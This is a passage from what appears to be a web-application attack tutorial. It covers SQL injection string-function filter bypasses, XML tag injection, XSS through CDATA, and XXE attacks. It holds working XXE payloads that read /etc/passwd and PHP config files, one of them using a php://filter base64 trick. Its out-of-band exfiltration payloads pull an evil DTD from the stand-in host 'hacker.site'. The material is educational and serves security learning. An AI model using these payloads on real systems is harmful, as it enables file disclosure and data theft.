<pre><code class="lang-mysql"><span class="hljs-function"><span class="hljs-title">LOWER</span><span class="hljs-params">(CONV(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span>) <span class="hljs-comment">// 'a'</span>
<span class="hljs-function"><span class="hljs-title">LCASE</span><span class="hljs-params">(CONV(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span>) <span class="hljs-comment">// 'a'</span>
<span class="hljs-function"><span class="hljs-title">UPPER</span><span class="hljs-params">(CONV(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span>) <span class="hljs-comment">// 'A'</span>
<span class="hljs-function"><span class="hljs-title">UCASE</span><span class="hljs-params">(CONV(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span>) <span class="hljs-comment">// 'A'</span>
</code></pre>
<h4 id="-locate-instr-position-"><strong>LOCATE, INSTR, POSITION</strong></h4>
<p>If you cannot build a string, you can try to locate either a segment or an entire string using functions that return the position of the first occurrence of substrings, and then use conditional statements for the Boolean condition. See the example below:</p>
<pre><code class="lang-mysql">IF(<span class="hljs-name">LOCATE</span>('H',SUBSTR(<span class="hljs-name">USERNAME</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)
</code></pre>
<p>You can also use functions <strong>INSTR</strong> and <strong>POSITION</strong>.</p>
<h4 id="-substr-mid-substring-"><strong>SUBSTR, MID, SUBSTRING</strong></h4>
<p>We have seen how construct substrings use SUBSTR; let&#39;s see other alternatives just in case we may need them.</p>
<p>The first is <code>MID</code>; this is nothing more than a synonym of <strong>SUBSTRING</strong>, which is a synonym of SUBSTR! With the right syntax, all of these do not need a comma to separate the parameters.</p>
<pre><code class="lang-mysql">[<span class="hljs-string">SUBSTR|MID|SUBSTRING</span>](<span class="hljs-link">'HELLO' FROM 1 FOR 1</span>)
</code></pre>
<h4 id="-alternatives-"><strong>Alternatives</strong></h4>
<p>Tricky alternatives to the previous functions are: <code>LEFT</code>, <code>RIGHT</code>. These are useful in retrieving the <code>left|right</code> most specified character:</p>
<pre><code class="lang-mysql">[<span class="hljs-string">LEFT|RIGHT</span>](<span class="hljs-link">'HELLO', 2</span>) // HE or LO
</code></pre>
<p>Padding functions like <code>RPAD</code> and <code>LPAD</code> are also other alternatives and look like this:</p>
<pre><code class="lang-mysql">[<span class="hljs-string">LPAD|RPAD</span>](<span class="hljs-link">'HELLO', 6, '?'</span>) // ?HELLO or HELLO?
[<span class="hljs-string">LPAD|RPAD</span>](<span class="hljs-link">'HELLO', 1, '?'</span>) // H
[<span class="hljs-string">LPAD|RPAD</span>](<span class="hljs-link">'HELLO', 5, '?'</span>) // HELLO
</code></pre>
<h2 id="-bypassing-function-filters-"><strong>Bypassing Function Filters</strong></h2>
<p>All in all, we have seen how to exploit system features like variables, functions, etc., to construct obfuscated payloads that can deceive blacklist filters.</p>
<h2 id="-labs-"><strong>Labs</strong></h2>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#sql-injection">https://portswigger.net/web-security/all-labs#sql-injection</a></li>
<li><a href="https://tryhackme.com/room/sqlilab">https://tryhackme.com/room/sqlilab</a></li>
<li><a href="https://cyard.0x4148.com/">https://cyard.0x4148.com/</a></li>
<li><a href="https://livelabs.0x4148.com/lims/">https://livelabs.0x4148.com/lims/</a></li>
<li><a href="http://github.com/Yavuzlar/VulnLab">http://github.com/Yavuzlar/VulnLab</a></li>
</ul>
<hr>
<h1 id="-xml-attacks-"><strong>XML Attacks</strong></h1>
<h3 id="-introduction-"><strong>Introduction</strong></h3>
<p>Despite the arrival of &quot;newer&quot; data structure format languages, such as YAML and JSON , the <strong>eXtensible Markup Language</strong> remains both alive and a prevalent alternative for exchanging data over the internet.</p>
<p>There are many fields of use that leverage <strong>XML</strong>. These include PDF, RSS, OOXML (.docx, .pptx, etc.), SVG, and finally networking protocols, such as XMLRPC, SOAP, WebDAV and so many others.</p>
<p>In this module, we are going to explore the primary attack techniques against XML data structures. We’ll talk about XML TAG Injection, XML External Entities, XML Entities Expansion, and finally, XPath Injection.</p>
<h3 id="-xml-attacks-recap-more-"><strong>XML Attacks: Recap &amp; More</strong></h3>
<p>Technically, XML is derived from the <strong>SGML</strong> standard and is the same standard on which HTML * is based, however, with a lightweight implementation. This means that some SGML-based features, such as unclosed end-closed tags, etc. are not implemented.</p>
<p>Nevertheless, there is a <strong>Document Type Definition (DTD)</strong> that is used to define the legal building blocks of an XML document. These blocks are as follows:</p>
<ul>
<li>Elements</li>
<li>Tags</li>
<li>Attributes</li>
<li>Entities</li>
<li>PCDATA</li>
<li>CDATA</li>
</ul>
<p>An interesting feature of XML documents is the possibility to define the DTD structure either internally or externally. In addition to this, the ability to allow importing is equally interesting.</p>
<p>Let’s see two alternative techniques and, at the same time, see how blocks are declared.</p>
<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- Internal DTD --&gt;</span>
<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message [ 
 &lt;!ELEMENT message (from,to,body)&gt;
 &lt;!ELEMENT from (#PCDATA)&gt;
 &lt;!ELEMENT to (#PCDATA)&gt;
 &lt;!ELEMENT body (#PCDATA)&gt;
 &lt;!ATTLIST body time CDATA ""&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Mario<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Luigi<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">time</span>=<span class="hljs-string">"16.39"</span>&gt;</span>Wanna play? - Cheers, SuperMario!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code></pre>
<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- External DTD --&gt;</span>
<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message SYSTEM "message.dtd"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Mario<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Luigi<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">time</span>=<span class="hljs-string">"16.39"</span>&gt;</span>Wanna play? - Cheers, SuperMario!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code></pre>
<pre><code class="lang-dtd"><span class="hljs-comment">&lt;!-- message.dtd external file --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">message</span> (<span class="hljs-attr">from</span>,<span class="hljs-attr">to</span>,<span class="hljs-attr">body</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">from</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">to</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">body</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ATTLIST</span> <span class="hljs-attr">body</span> <span class="hljs-attr">time</span> <span class="hljs-attr">CDATA</span> ""&gt;</span>
</code></pre>
<h4 id="-entities-block-"><strong>Entities Block</strong></h4>
<p>In the last few examples, we saw how to define the <strong>logical structure</strong> of a document. Simply put, this is what elements must be included in the XML, their attributes and in what order to include them. To allow for flexibility, the specifications have introduced <strong>physical structures (Entities)</strong>.</p>
<p>This is nothing new considering that we see and use entities everyday with HTML (see <code>&amp;lt;</code> (&lt;), <code>&amp;amp;</code> (&amp;), <code>&amp;copy;</code> (©) etc.).</p>
<p>What if we are able to define our entities, as you will see in the next example? Yes, this is much more interesting from an attacker point of view!</p>
<h5 id="-xml-document-with-external-dtd-entities-"><strong>XML Document with External DTD + Entities</strong></h5>
<pre><code class="lang-dtd"><span class="hljs-comment">&lt;!-- message.dtd external file --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">message</span> (<span class="hljs-attr">from</span>,<span class="hljs-attr">to</span>,<span class="hljs-attr">body</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">from</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">to</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">body</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ATTLIST</span> <span class="hljs-attr">body</span> <span class="hljs-attr">time</span> <span class="hljs-attr">CDATA</span> ""&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">sign</span> "<span class="hljs-attr">-</span> <span class="hljs-attr">Cheers</span>, <span class="hljs-attr">SuperMario</span>!"&gt;</span>
</code></pre>
<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- External DTD --&gt;</span>
<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message SYSTEM "message.dtd"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Mario<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Luigi<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">time</span>=<span class="hljs-string">"16.39"</span>&gt;</span>Wanna play? &amp;sign;<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
 <span class="hljs-comment">&lt;!-- Wanna play? - Cheers, SuperMario! --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code></pre>
<p>There are various types of entities, depending upon where they are declared, how reusable they are, and if they need to be parsed. They can be categorized, as follows:</p>
<ul>
<li>Internal, External</li>
<li>General, Parameter</li>
<li>Parsed, Unparsed</li>
</ul>
<p>Among the 8 combinations, only 5 entity category combinations are considered legal. They are:</p>
<ul>
<li>Internal<ul>
<li>General + Parsed</li>
<li>Parameter + Parsed</li>
</ul>
</li>
<li>External<ul>
<li>General + Parsed</li>
<li>General + Unparsed</li>
<li>Parameter + Parsed</li>
</ul>
</li>
</ul>
<p>Wrapping up this brief introduction on XML structure, let&#39;s analyze the main security issues related to XML Injection Attacks.</p>
<p>Generally speaking, in these types of attacks there are three options: the <strong>XML is tampered</strong>, an <strong>XML document</strong> containing an attack <strong>is sent</strong>, or the <strong>XML is taken</strong> using a querying mechanism.</p>
<h2 id="-xml-tag-injection-"><strong>XML Tag Injection</strong></h2>
<p>The first attack type is the <strong>Tag/Fragment Injection</strong>. In this scenario, the attacker is able to alter the XML document structure by injecting both XML data and XML tags.</p>
<p>For example, let’s assume that a web application is using an XML file to store users with this structure:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>secretpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>joe<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>joespassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>users<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span>
</code></pre>
<p>If either updating his profile or during the registration process, Joe is able to inject some <strong>XML metacharacters</strong> within the document. Then, if the application fails to contextually validate data, it is vulnerable to XML Injection.</p>
<p>Metacharacters: &#39; &quot; &lt; &gt; &amp;</p>
<p>In order to test the application against XML Injection, we have to inject metacharacters, attempting to break some of the structures. This will result in throwing exceptions during XML parsing.</p>
<p>Let’s see some examples.</p>
<h3 id="-testing-xml-injection-single-double-quotes-"><strong>Testing XML Injection – Single/Double Quotes</strong></h3>
<p>Single and Double quotes are used to define an attribute value in the tag:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">group</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"id"</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span>
</code></pre>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">group</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'id'</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span>
</code></pre>
<p>An id, like the following, will make the XML incorrect:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">group</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"12"</span>"&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span>
</code></pre>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">group</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'12'</span>'&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span>
</code></pre>
<p>Another metacharacter is the <strong>ampersand</strong>, which is used to represent entities in this way: <code>&amp;EntityName;</code></p>
<p>By injecting <code>&amp;name;</code>, we can trigger an error if the entity is not defined. Additionally, we can attempt to remove the final <code>;</code>, generating a malformed XML structure.</p>
<h3 id="-testing-xml-injection-angular-parentheses-"><strong>Testing XML Injection – Angular Parentheses</strong></h3>
<p>Using angular parentheses, we can begin to define several areas within the XML document such as tag names, comments, and CDATA sections.</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">tagname</span>&gt;</span> <span class="hljs-comment">&lt;!--  --&gt;</span> &lt;![CDATA[value]]&gt;
</code></pre>
<h3 id="-testing-xml-injection-xss-with-cdata-"><strong>Testing XML Injection – XSS with CDATA</strong></h3>
<p>In addition to breaking the structure and throwing exceptions, we can also try exploiting the XML parser, thereby introducing both a possible XSS attack vector and possibly bypassing a weak filter.</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">&lt;![CDATA[alert]]&gt;('XSS')</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>During XML processing, the CDATA section is eliminated, generating the infamous XSS payload:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'XSS'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>With CDATA structures, it is also possible to escape angular parentheses, as in our following example:</p>
<pre><code class="lang-xml">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('XSS')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
</code></pre>
<p>This can translate into the following:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'XSS'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 id="-xml-external-entity-"><strong>XML eXternal Entity</strong></h2>
<p>The most dangerous type of <strong>XML Injection</strong> attacks consist of injecting external entities into the document definition; this type of attack is known as <strong>XXE (XML eXternal Entities)</strong>.</p>
<p>In general, the idea is to tell XML parsers to load externally defined entities, therefore making it possible to access sensitive content stored on the vulnerable host.</p>
<h3 id="-taxonomy-"><strong>Taxonomy</strong></h3>
<p>There are two kinds of External Entities: <strong>Private</strong> and <strong>Public</strong>. The differences are based upon the usage.</p>
<p>Private external entities are restricted to a either a single author or group of authors. Public, on the other hand, was designed for a broader usage.</p>
<h4 id="-external-entities-private-vs-public-"><strong>External Entities: Private vs. Public</strong></h4>
<pre><code class="lang-xml">&lt;!ENTITY <span class="hljs-built_in">name</span> SYSTEM <span class="hljs-string">"URI"</span>&gt;
</code></pre>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message [ 
  &lt;!ELEMENT sign (#PCDATA)&gt;
  &lt;!ENTITY c SYSTEM "http://my.site/copyright.xml"&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">sign</span>&gt;</span>&amp;c;<span class="hljs-tag">&lt;/<span class="hljs-name">sign</span>&gt;</span>
</code></pre>
<pre><code class="lang-xml">&lt;!ENTITY <span class="hljs-built_in">name</span> PUBLIC <span class="hljs-string">"PublicID"</span> <span class="hljs-string">"URI"</span>&gt;
</code></pre>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message [ 
  &lt;!ELEMENT sign (#PCDATA)&gt;
  &lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://my.site/copyright.xml"&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">sign</span>&gt;</span>&amp;c;<span class="hljs-tag">&lt;/<span class="hljs-name">sign</span>&gt;</span>
</code></pre>
<p>It is important to note that the URI field does not limit XML parses from resolving HTTP(s) protocols only. There are a number of valid URI Schemes allowed (FILE, FTP, DNS, PHP, etc.).</p>
<h3 id="-xml-external-entity-"><strong>XML eXternal Entity</strong></h3>
<p>With external entities, we can create dynamic references in the document. Clearly, the most dangerous entities are the private ones because they allow us to disclose local system files, play with network schemes, manipulate internal applications, etc.</p>
<p>Let&#39;s see some useful techniques to attack XML parsers and inject XML External Entities.</p>
<h4 id="-resource-inclusion-"><strong>Resource Inclusion</strong></h4>
<p>The first example of <strong>XXE</strong> exploitation is <strong>resource inclusion</strong>. In this scenario, the attacker uploads/crafts a malicious XML file. This includes an external entity definition that points to a local file.</p>
<pre><code class="lang-xml">&lt;!ENTITY xxefile SYSTEM <span class="hljs-string">"file:///etc/passwd"</span>&gt;
</code></pre>
<p>Next, in the body of the xml request, they put the reference to the created entity:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message [ 
  …
  &lt;!ENTITY xxefile SYSTEM "file:///etc/passwd"&gt;
  …
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
  …
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>&amp;xxefile;<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
  …
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code></pre>
<p>After sending the request to both trigger the attack and force the XML parser into fetching the malicious content, we must coax the application in to providing the information sent.</p>
<p>In the continuation of our example, once the receiver reads the message, he will not only see the body of the message, but also the content of the external entity <code>&amp;xxefile;</code>(<code>/etc/passwd</code> file).</p>
<p>Everything is ok! This is because we want to retrieve resources that are either well formatted XML or files which won&#39;t cause errors during the parsing process.</p>
<p>For example, <code>&amp;</code>, <code>&lt;</code> and <code>&gt;</code> are XML special characters and will cause errors. Content must conform to the encoding declaration and therefore cannot contain binary data.</p>
<h5 id="-invalid-resource-to-extract-"><strong>Invalid Resource to Extract</strong></h5>
<p>We want to access a php configuration file like the following:</p>
<pre><code class="lang-php">&lt;?php
 <span class="hljs-comment"># Secret configuration file...</span>
 <span class="hljs-variable">$config</span> = array()<span class="hljs-comment">;</span>
 <span class="hljs-variable">$config</span>[<span class="hljs-string">'username'</span>] = <span class="hljs-string">'hiddenuser'</span><span class="hljs-comment">;</span>
 <span class="hljs-variable">$config</span>[<span class="hljs-string">'password'</span>] = <span class="hljs-string">'My<span class="hljs-variable">$up</span>&amp;r<span class="hljs-variable">$6kr3tP</span>@<span class="hljs-subst">$$</span>'</span><span class="hljs-comment">;</span>
</code></pre>
<p>Using a &quot;classic technique&quot;, the exploitation will fail; this is just because the target file contains special chars!</p>
<p>We need an alternative method to extract these types of resources.</p>
<p>In addition to document entities, the specification provides <strong>Parameter Entities</strong>. These are special (<strong>parsed</strong>) entities to be used only within the <strong>DTD</strong> definition. They are <strong>powerful</strong>, especially for clever users! Let’s check out some examples.</p>
<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- Parameter Entity definitions --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">name</span> "<span class="hljs-attr">value</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">name</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">URI</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">name</span> <span class="hljs-attr">PUBLIC</span> "<span class="hljs-attr">PublicID</span>" "<span class="hljs-attr">URI</span>"&gt;</span>
</code></pre>
<h5 id="-cdata-escape-using-parameter-entities-"><strong>CDATA Escape Using Parameter Entities</strong></h5>
<p>In the previous example, we attempted to extract a non conforming XML file by using a mix of joining entities; however, this failed because each entity must first be formatted correctly.</p>
<p>By both adopting the same approach and using Parameter Entities it is possible to retrieve the resource content.</p>
<pre><code class="lang-xml"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE message [ 
  …
  &lt;!ENTITY % a "&lt;![CDATA["&gt;
  &lt;!ENTITY % xxefile SYSTEM "file:///path/to/config.php"&gt;
  &lt;!ENTITY % z "]]&gt;</span>"&gt;
  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">ExtDTD</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">http:</span>//<span class="hljs-attr">hacker.site</span>/<span class="hljs-attr">xml</span>/<span class="hljs-attr">xxe</span>/<span class="hljs-attr">evil.dtd</span>"&gt;</span>
</span><span class="perl">  %ExtDTD;</span><span class="xml">
  <span class="hljs-comment">&lt;!-- &lt;!ENTITY join "%a;%xxefile;%z;"&gt; --&gt;</span>
]&gt;
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
  …
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>&amp;join;<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
  …
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span>
</code></pre>
<pre><code class="lang-dtd"><span class="hljs-comment">&lt;!-- http://hacker.site/xml/xxe/evil.dtd --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">join</span> "%<span class="hljs-attr">a</span>;%<span class="hljs-attr">xxefile</span>;%<span class="hljs-attr">z</span>;"&gt;</span>
</code></pre>
<p>Generally speaking, mixing <strong>CDATA</strong> with <strong>Parameter Entities</strong> works in major XML parsers; however, in PHP there is an alternative that allows us to bypass the restriction on file content (<code>php://</code> built-in wrapper).</p>
<p>PHP provides several I/O stream features. One of the most widely used and interesting, from a security perspective, is <code>php://filter</code>. This is a kind of meta-wrapper designed to convert the application filters to a stream at the time of opening.</p>
<p>In order to avoid XML parsing errors, we need a filter that reads the target file and then converts the content into a format that is harmless to the XML structure. Can you guess the format?</p>
<p>Yes, Base64 is our friend! To encode the target content we need to add the following heading before the entity URI path:</p>
<pre><code>php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=/path/<span class="hljs-built_in">to</span>/config.php
</code></pre><pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
<span class="hljs-meta">&lt;!DOCTYPE message [ 
  …
  &lt;!ENTITY xxefile SYSTEM "php://filter/read=convert.base64-encode/resource=/path/to/config.php"&gt;
  …
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
  …
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>&amp;xxefile;<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
  …
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code></pre>
<p>Result content is encoded in <strong>Base64</strong>.</p>
<h3 id="-bypassing-access-controls-"><strong>Bypassing Access Controls</strong></h3>
<p>An XXE flaw can help in bypassing various types of access control policies. For example, let&#39;s improve the previous PHP configuration file by adding an access restriction to a local server IP addresses.</p>
<pre><code class="lang-php"><span class="hljs-variable">$allowedIPs</span> = array(<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-string">'192.168.1.69'</span>);
<span class="hljs-keyword">if</span> (!in_array(@<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REMOTE_ADDR'</span>], <span class="hljs-variable">$allowedIPs</span>)) {
    header(<span class="hljs-string">'HTTP/1.0 403 Forbidden'</span>);
    <span class="hljs-keyword">exit</span>(<span class="hljs-string">'Access denied.'</span>);
}

<span class="hljs-comment"># Secret information are echoed below...</span>
<span class="hljs-comment"># …</span>
</code></pre>
<p>If we attempt to access it from the web, an &quot;ACCESS DENIED&quot; page will be displayed. However, if the frontend is vulnerable to XXE, we can exploit the flaw and steal the page content.</p>
<h3 id="-out-of-band-data-retrieval-"><strong>Out-Of-Band Data Retrieval</strong></h3>
<p>The attacks we have seen up to this point have something in common; in order to correctly exploit the vulnerability and read the targeted content, the application must expose XML contents after the exploitation.</p>
<p>We are now going to see an Out-Of-Band (OOB) technique that we can use when we want to extract file contents without any direct output.</p>
<pre><code class="lang-xml"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE message [ 
  &lt;!ENTITY % EvilDTD SYSTEM "http://hacker.site/xml/xxe/evil_oob.dtd"&gt;
</span></span><span class="perl">  %EvilDTD;</span><span class="xml"><span class="hljs-meta">
</span></span><span class="perl">  %LoadOOBEnt;</span><span class="xml"><span class="hljs-meta">
</span></span><span class="perl">  %OOB;</span><span class="xml"><span class="hljs-meta">
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>
  …
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
  …
<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span>
</code></pre>
<pre><code class="lang-dtd"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">resource</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">php:</span>//<span class="hljs-attr">filter</span>/<span class="hljs-attr">read</span>=<span class="hljs-string">convert.base64-encode/resource</span>=<span class="hljs-string">file:///c:/windows/win.ini</span>"&gt;</span>
